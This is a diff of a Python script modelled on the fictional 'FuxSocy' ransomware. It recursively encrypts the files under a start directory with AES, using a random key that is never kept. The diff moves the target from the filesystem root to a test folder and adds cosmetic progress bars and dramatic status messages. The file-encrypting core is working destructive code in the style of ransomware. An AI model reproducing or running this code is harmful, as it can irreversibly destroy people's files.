@@ -2,13 +2,15 @@
 
 import os
 import time
+import sys
+import subprocess
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 from Crypto import Random
 from random import SystemRandom
 from string import ascii_letters, digits, punctuation
 
-START_DIR = '/'
+START_DIR = '/Users/developer/test_dir'
 SALT = 'fsociety'
 CS = 64*1024
 
@@ -30,6 +32,7 @@ def encrypt(root, filename, key):
                 elif len(chunk) % 16 != 0:
                     chunk += b' ' * (16 - (len(chunk) % 16))
                 outfile.write(encryptor.encrypt(chunk))
+    pass
 
 
 def recurse(directory, key):
@@ -56,19 +59,53 @@ def recurse(directory, key):
 
 
 def gen_key(salt):
-    print('Generating key...')
+    os.urandom(16)
+    print('Loading Source of Entropy')
     password = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(40, 160)))) for x in range(SystemRandom().randint(80, 120)))
+    update_progress(0.3)
+    time.sleep(0.4)
+    update_progress(0.6)
+    time.sleep(0.2)
+    update_progress(1)
+    print()
+    print('\nGenerating Keys')
+    update_progress(0.3)
     hasher = SHA256.new(password.encode('utf-8'))
+    time.sleep(0.6)
+    update_progress(0.5)
+    time.sleep(0.6)
+    update_progress(1)
+    print()
+    print()
     return hasher.digest()
 
 
+def update_progress(progress):
+    barLength = 23
+    status = ""
+    if isinstance(progress, int):
+        progress = float(progress)
+    if progress >= 1:
+        progress = 1
+        status = "COMPLETE"
+    block = int(round(barLength*progress))
+    text = "\r{0}\t\t{1}".format("#"*block + " "*(barLength-block), status)
+    sys.stdout.write(text)
+    sys.stdout.flush()
+
+
 def pwn():
-    f = open('fsociety01.dat', 'r')
-    for line in f:
-        time.sleep(0.03)
-        print(line, end='')
+    # f = open('fsociety01.dat', 'r')
+    # for line in f:
+    #     time.sleep(0.03)
+    #     print(line, end='')
+    subprocess.call('clear')
+    print('Executing FuxSocy')
     key = gen_key(SALT)
+    print('Locating target files.')
     dirs = next(os.walk(START_DIR))[1]
+    time.sleep(0.7)
+    print('beginning crypto operations')
     for dir in dirs:
         if START_DIR == '/':
             directory = START_DIR + dir
